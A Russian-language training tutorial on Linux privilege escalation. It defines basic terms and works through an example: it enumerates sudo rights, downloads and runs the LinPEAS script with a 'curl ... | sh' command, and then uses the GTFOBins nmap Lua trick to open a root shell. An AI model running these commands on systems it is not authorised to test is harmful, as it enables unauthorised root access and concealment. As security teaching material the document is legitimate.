### Основные понятия

**DMZ (англ. Demilitarized Zone — демилитаризованная зона, ДМЗ)** — сегмент сети, содержащий общедоступные сервисы и
отделяющий их от частных. Цель ДМЗ — добавить дополнительный уровень безопасности в локальной сети, позволяющий
минимизировать ущерб в случае атаки на один из общедоступных сервисов: внешний злоумышленник имеет прямой доступ только
к оборудованию в ДМЗ.

**Повышение привилегий** — это использование различных уязвимостей операционной системы и прикладного программного
обеспечения для повышения своих полномочий в атакуемой системе.

**Root (от англ. root — корень; читается «рут»)**, или суперпользователь — это специальный аккаунт и группа
пользователей в
UNIX- подобных системах с идентификатором пользователя UID 0 (User IDentifier), владелец которого имеет право на
выполнение всех без исключения операций.

**sudo** (англ. Substitute User and do, дословно «подменить пользователя и выполнить») — программа для системного
администрирования UNIX-систем, позволяющая делегировать те или иные привилегированные ресурсы пользователям с ведением
протокола работы.

**su** (сокр. от англ. Substitute User, Set UID, Switch User, Super User — замена пользователя, переключение
пользователя,
суперпользователь) — команда Unix-подобных операционных систем, позволяющая пользователю войти в систему под другим
именем, не завершая текущий сеанс.

### Разбор базового примера

Вы оказались на узле с Linux ОС, ваша задача — повысить свои привилегии до уровня Root.

Ход действий

1. Проверим права текущего пользователя:

        $ id

    2. Отмечаем, что текущий пользователь входит в группу sudo и, следовательно, может выполнять различные команды с
       повышенными привилегиями. Получаем список таких команд:

             $ sudo -l

        3. Видим, что мы можем запускать утилиту nmap, не вводя пароль; проверим, что права действительно повышаются,
           использовав опцию сканирования -sS, доступную только для root:

                  $ sudo nmap -sS localhost

4. Для более полного поиска векторов для повышения прав воспользуемся утилитой LinPEAS:

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

Скачаем и выполним этот скрипт, проанализируем его вывод:

$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

5. Для поиска способов выполнить произвольного кода с помощью утилиты с повышенными привилегиями обратимся к
   ресурсу https://gtfobins.github.io/ и найдем там nmap. Чтобы получить интерактивный шелл с правами root,
   воспользуемся командами с ресурса gtfobins и заставим nmap выполнить Lua-скрипт, открывающий командную оболочку:

Создадим временный файл с кодом скрипта и сохраним его имя в переменную TF:

    $ TF=$(mktemp)

Добавим код, открывающий оболочку sh:

    $ echo 'os.execute("/bin/sh")' > $TF

6. Запустим скрипт от имени root с помощью sudo и nmap:

        $ sudo nmap --script=$TF

    7. Проверяем полученные права:

             $ id

#### Общие принципы

Цели повышения привилегий:

Получение произвольного доступа ко всем хранящимся в системе данным
Использование возможностей системы, недоступных для обычного пользователя
Модификация работающего в системе программного обеспечения для сбора дополнительной информации
Сокрытие следов активности от системного администратора
Обеспечение условий для атаки на гипервизор
Методы повышения привилегий
Использование физического доступа

Например, когда вы получаете совершенно простой доступ на уровне вытаскивания диска или изменения пароля через загрузчик
grub.

Использование ошибок администрирования

Это те ошибки, которые возникают из-за недочетов администраторов, а не из-за ошибок в конкретном ПО, установленном в ОС

Эксплуатация логических бинарных уязвимостей привилегированных сервисов

Такие ситуации возможны, когда мы обнаружили уязвимость в установленном ПО, работающем под высокими привилегиями.

Атаки на ядро Linux

Большинство атак на ядро Linux связаны с повреждением его памяти.

В этом уровне мы рассмотрим наиболее часто используемый и легко осваиваемый метод повышения привилегий: использование
ошибок администрирования.